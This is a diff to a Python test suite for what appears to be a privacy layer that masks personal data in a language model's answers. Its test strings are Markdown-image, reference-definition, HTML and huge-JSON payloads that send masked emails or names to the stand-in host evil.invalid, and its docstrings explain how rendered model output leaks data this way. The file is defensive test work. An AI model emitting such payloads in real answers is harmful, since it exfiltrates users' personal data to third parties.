@@ -303,17 +303,13 @@ def test_aliases_inside_links_stay_masked():
 
 
 def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
-    """An image is fetched as soon as it is shown, and can use a definition anywhere in the
-    answer (`![a][[PERSON_1]]` tells a third party which candidate name is the real one); an
-    HTML block can run across blank lines and `<[PERSON_1]` becomes a tag once the name is
-    back; a client decoding JSON, JSON5 or YAML turns escapes into marks. From the first image,
-    `<` (unless a space, `=` or digit follows) or backslash on, aliases stay masked."""
+    """An image is fetched as soon as it is shown; an HTML block can run across blank lines
+    and `<[PERSON_1]` becomes a tag once the name is back; a client decoding JSON, JSON5 or YAML
+    turns escapes into marks. From the first image, `<` (unless a space, `=` or digit follows)
+    or backslash on, aliases stay masked."""
     answers = [
         "![b](https://evil.invalid/q?e=[EMAIL_1])\n\n[PERSON_1]",
         "![f]( //evil.invalid/[EMAIL_1].png)\n\n[PERSON_1]",
-        "![a][[PERSON_1]]\n\n[Jean Dupont]: https://evil.invalid/HIT.png",
-        "![[PERSON_1]]\n\n[jean dupont]: https://evil.invalid/HIT.png",
-        "![[PERSON_1]][]\n\n[jean dupont]: https://evil.invalid/HIT.png",
         "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
         '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
         "<style>\n\nbody{background:url(https:evil.invalid/c?d=[EMAIL_1])}\n</style>",
@@ -335,14 +331,20 @@ def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
 
 
 def test_with_a_reference_definition_nothing_is_restored():
-    """A definition serves images anywhere in the answer and its label may hold an alias, even
-    across a blank line that a YAML decoder folds away: nothing is restored at all."""
+    """A definition serves images anywhere in the answer (`![a][[PERSON_1]]` against candidate
+    definitions tells a third party which name is the real one) and its label may hold an
+    alias, even across a blank line a YAML decoder folds away: nothing is restored at all."""
     definitions = [
         "[[PERSON_1]]: https://evil.invalid/HIT.png\n\n![a][jean dupont] [EMAIL_1]",
         'note: "[[PERSON_1]\n\n  ]: https://evil.invalid/HIT.png\n\n  ![a][Jean Dupont]"',
         "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
         "> [r]: //evil.invalid/?q=[EMAIL_1]",
         "[EMAIL_1]: écrire.",
+        "[[PERSON_1]<x>]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont<x>]",
+        "![a][[PERSON_1]]\n\n[Jean Dupont]: https://evil.invalid/HIT.png",
+        "![[PERSON_1]]\n\n[jean dupont]: https://evil.invalid/HIT.png",
+        "![[PERSON_1]][]\n\n[jean dupont]: https://evil.invalid/HIT.png",
+        "[[PERSON_1]\\!]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont\\!]",
     ]
     for definition in definitions:
         answer = f"Bonjour [PERSON_1].\n\n{definition}"
@@ -364,6 +366,12 @@ def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
         {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
         ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
     ]
+    huge = '{"a": "[EMAIL_1])", "1": "![x](https://evil.invalid/p.png?q=", "n": ' + "1" * 4301
+    deep = "[" * 100_000 + '"[EMAIL_1]"' + "]" * 100_000
+    for raw in (huge + "}", deep):  # Python's json refuses them, a browser reads the first
+        for mode in ({"response_format": {"type": "json_object"}}, {}):
+            response = ask(bridge(FakeMistral(reply=raw)), USER_MESSAGE, **mode)
+            assert response.json()["choices"][0]["message"]["content"] == raw
     for document in linked:
         for mode in ({"response_format": {"type": "json_object"}}, {}):
             reply = json.dumps(document)
